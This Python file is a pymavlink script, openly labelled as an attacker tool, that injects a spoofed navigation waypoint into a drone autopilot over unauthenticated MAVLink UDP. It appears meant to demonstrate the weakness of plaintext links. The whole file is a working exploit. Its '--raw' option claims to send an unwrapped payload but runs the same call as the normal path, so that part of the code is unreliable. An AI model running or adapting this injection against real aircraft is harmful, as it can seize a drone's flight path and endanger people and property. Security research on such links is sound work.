"""
Simple attacker script that injects a fake waypoint (MISSION_ITEM_INT) to a running autopilot
Requires: pymavlink
This demonstrates injection when traffic is plaintext (no secure proxies).
"""
import argparse
from pymavlink import mavutil

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Attacker: send fake waypoint to drone')
    parser.add_argument('--target-host', default='127.0.0.1')
    parser.add_argument('--target-port', type=int, default=14550, help='UDP port to send to')
    parser.add_argument('--lat', type=float, default=37.4275)
    parser.add_argument('--lon', type=float, default=-122.1697)
    parser.add_argument('--alt', type=float, default=10.0)
    parser.add_argument('--raw', action='store_true', help='Send raw UDP payload (no MAVLink wrapper)')
    args = parser.parse_args()

    # Use a distinct source system id to simulate attacker
    conn = mavutil.mavlink_connection(f'udpout:{args.target_host}:{args.target_port}', source_system=250)
    print('Attacker sending MISSION_ITEM_INT to', args.target_host, args.target_port, 'raw=', args.raw)
    if args.raw:
        # craft mission_item_int with full signature:
        # target_system, target_component, seq, frame, command, current, autocontinue,
        # param1, param2, param3, param4, x, y, z
        conn.mav.mission_item_int_send(
            0, 0, 0,
            mavutil.mavlink.MAV_FRAME_GLOBAL_INT,
            mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
            0, 1,
            0, 0, 0, 0,
            int(args.lat * 1e7),
            int(args.lon * 1e7),
            int(args.alt)
        )
    else:
        conn.mav.mission_item_int_send(
            0, 0, 0,
            mavutil.mavlink.MAV_FRAME_GLOBAL_INT,
            mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
            0, 1,
            0, 0, 0, 0,
            int(args.lat * 1e7),
            int(args.lon * 1e7),
            int(args.alt)
        )

    print('Injected waypoint:', args.lat, args.lon, args.alt)
